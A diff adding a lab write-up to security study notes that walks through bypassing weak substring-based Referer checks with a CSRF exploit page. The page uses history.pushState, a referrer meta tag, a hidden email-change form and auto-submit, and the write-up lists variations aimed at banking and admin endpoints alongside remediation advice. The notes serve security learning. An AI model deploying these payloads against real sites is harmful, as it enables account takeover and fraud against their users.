@@ -5292,3 +5292,477 @@ CSRF succeeds
 ```text
 If Referer is only validated when present, removing it completely bypasses CSRF protection.
 ```
+
+---
+
+# 🐞 Lab-12 — Referer-Based CSRF Bypass using pushState()
+
+---
+
+## 🔥 Overview
+
+This lab demonstrates a weak CSRF defense that relies on:
+
+```http
+Referer
+```
+
+validation.
+
+The application attempts to verify requests by checking whether the Referer contains the target domain.
+
+However:
+
+❌ Validation uses weak substring matching  
+❌ It does NOT validate proper origin structure  
+
+---
+
+👉 Result:
+
+Attacker can inject the trusted domain inside the URL and bypass CSRF protection.
+
+---
+
+## 🧠 What Is This Topic?
+
+### 🔹 Weak Referer Validation
+
+Server logic:
+
+```python
+if "victim.com" in Referer:
+    allow
+else:
+    block
+```
+
+---
+
+### ❌ Core Problem
+
+The application only checks whether the trusted domain appears ANYWHERE inside the Referer.
+
+Example bypass:
+
+```text
+https://evil.com/?victim.com
+```
+
+---
+
+👉 Server sees:
+
+```text
+victim.com
+```
+
+and incorrectly trusts the request.
+
+---
+
+## 🧪 Lab Walkthrough (Step-by-Step)
+
+---
+
+### 🧩 Step 1 — Initial Recon
+
+Login:
+
+```text
+wiener:peter
+```
+
+Change email normally.
+
+Capture request:
+
+```http
+POST /my-account/change-email
+```
+
+---
+
+### 🧠 Observation
+
+Application uses Referer validation.
+
+---
+
+### 🧩 Step 2 — Test Validation Behavior
+
+#### 🔹 Modify Referer
+
+```http
+Referer: https://evil.com
+```
+
+---
+
+### 🧠 Result
+
+❌ Request rejected
+
+---
+
+#### 🔹 Inject Trusted Domain into Query String
+
+```http
+Referer: https://evil.com/?YOUR-LAB-ID.web-security-academy.net
+```
+
+---
+
+### 🧠 Result
+
+✔ Request accepted
+
+---
+
+### 🧠 Vulnerability Confirmed
+
+Server performs weak substring validation instead of strict origin validation.
+
+---
+
+## 📸 Screenshot — Weak Referer Validation Bypass
+
+![referer-substring-bypass](../images/referer-substring-bypass.png)
+
+---
+
+### 🧩 Step 3 — Choose Exploit Technique
+
+We use:
+
+```javascript
+history.pushState()
+```
+
+because it:
+
+✔ Changes URL without page reload  
+✔ Keeps exploit page alive  
+✔ Poisons Referer value  
+
+---
+
+### 🧩 Step 4 — Build Exploit
+
+---
+
+### 🔹 Part A — Poison URL
+
+```javascript
+<script>
+history.pushState("", "", "/?YOUR-LAB-ID.web-security-academy.net");
+</script>
+```
+
+---
+
+### 🧠 Purpose
+
+Inject trusted domain into browser URL.
+
+---
+
+### 🔹 Part B — CSRF Form
+
+```html
+<form action="https://YOUR-LAB-ID.web-security-academy.net/my-account/change-email" method="POST">
+    <input type="hidden" name="email" value="attacker@evil.com">
+</form>
+```
+
+---
+
+### 🔹 Part C — Auto-submit
+
+```javascript
+<script>
+document.forms[0].submit();
+</script>
+```
+
+---
+
+### 🔹 Part D — Required Header
+
+```html
+<meta name="referrer" content="unsafe-url">
+```
+
+---
+
+### 🧠 Why Important?
+
+Without this:
+
+Browser may strip query string from Referer.
+
+---
+
+### 🧩 Step 5 — Execution Flow
+
+Victim opens exploit page  
+↓  
+pushState poisons URL  
+↓  
+Browser generates poisoned Referer  
+↓  
+Form auto-submits  
+↓  
+Server checks substring only  
+↓  
+Validation passes  
+↓  
+Email changes successfully  
+
+---
+
+## 📸 Screenshot — Final Exploit Payload
+
+![final-exploit-payload](../images/final-exploit-payload-referer.png)
+
+---
+
+## 💣 Payload Breakdown
+
+### 🔹 URL Poisoning
+
+```javascript
+history.pushState("", "", "/?YOUR-LAB-ID.web-security-academy.net");
+```
+
+Injects trusted domain into URL.
+
+---
+
+### 🔹 Referrer Policy
+
+```html
+<meta name="referrer" content="unsafe-url">
+```
+
+Forces full URL inclusion inside Referer.
+
+---
+
+### 🔹 CSRF Form
+
+```html
+<form action="https://YOUR-LAB-ID.web-security-academy.net/my-account/change-email" method="POST">
+```
+
+Targets sensitive endpoint.
+
+---
+
+### 🔹 Silent Execution
+
+```javascript
+document.forms[0].submit();
+```
+
+Executes attack automatically.
+
+---
+
+## 🌍 Real-World Scenarios
+
+---
+
+### 🔥 Scenario 1 — Banking Applications
+
+Endpoints:
+
+```text
+/transfer
+/add-beneficiary
+/send-money
+```
+
+Weak logic:
+
+```python
+if "bank.com" in Referer:
+    allow
+```
+
+Attacker injects:
+
+```text
+evil.com/?bank.com
+```
+
+---
+
+### 🔥 Scenario 2 — Payment Gateways
+
+Applications trust partial Referer matches.
+
+Attackers poison query string.
+
+---
+
+### 🔥 Scenario 3 — OAuth / SSO Flows
+
+Redirect URLs pollute Referer.
+
+Weak validation breaks completely.
+
+---
+
+### 🔥 Scenario 4 — Admin Panels
+
+Endpoints:
+
+```text
+/admin/update-role
+/admin/delete-user
+```
+
+Protected only by weak Referer checks.
+
+---
+
+## ⚔️ Attack Chain
+
+1️⃣ Victim visits attacker page  
+2️⃣ pushState poisons URL  
+3️⃣ Browser builds poisoned Referer  
+4️⃣ Form auto-submits silently  
+5️⃣ Server performs substring check  
+6️⃣ Validation passes  
+7️⃣ Sensitive action executes  
+
+---
+
+## 🎯 High-Value Endpoints
+
+```text
+/change-email
+/change-password
+/transfer
+/add-beneficiary
+/admin/update-role
+/api/user/update
+```
+
+---
+
+## ⚠️ Real-World Variations
+
+---
+
+### 🔹 Variation 1 — Subdomain Trick
+
+```text
+bank.com.evil.com
+```
+
+---
+
+### 🔹 Variation 2 — Query String Injection
+
+```text
+evil.com/?bank.com
+```
+
+---
+
+### 🔹 Variation 3 — Path Injection
+
+```text
+evil.com/bank.com/profile
+```
+
+---
+
+### 🔹 Variation 4 — Referrer-Policy Abuse
+
+```html
+<meta name="referrer" content="unsafe-url">
+```
+
+Forces browser to leak full Referer.
+
+---
+
+## 🛡️ Remediation
+
+---
+
+### ✅ Fix 1 — Use CSRF Tokens
+
+Every sensitive request must require:
+
+```text
+session-bound
+unpredictable token
+```
+
+---
+
+### ✅ Fix 2 — Validate Origin Properly
+
+Use strict origin validation instead of substring checks.
+
+---
+
+### ✅ Fix 3 — Reject Partial Matches
+
+Correct logic:
+
+```python
+if origin != trusted_origin:
+    block
+```
+
+---
+
+### ✅ Fix 4 — Use SameSite Cookies
+
+```http
+Set-Cookie: session=xyz; SameSite=Strict
+```
+
+---
+
+### ✅ Fix 5 — Re-authentication
+
+Require password before sensitive actions.
+
+---
+
+## 🧠 Mental Model
+
+```text
+Weak Referer check
+↓
+Attacker poisons URL
+↓
+Browser leaks poisoned Referer
+↓
+Validation passes
+↓
+CSRF succeeds
+```
+
+---
+
+## 🎯 Final Summary
+
+✔ Referer substring validation is insecure  
+✔ pushState can poison browser URL silently  
+✔ Referrer-Policy controls Referer leakage  
+✔ Proper CSRF tokens are mandatory  
+
+---
+
+## 🔥 Final One-Liner
+
+```text
+Weak Referer substring checks can be bypassed by poisoning the URL using pushState and forcing the browser to leak a trusted-looking Referer.
+```
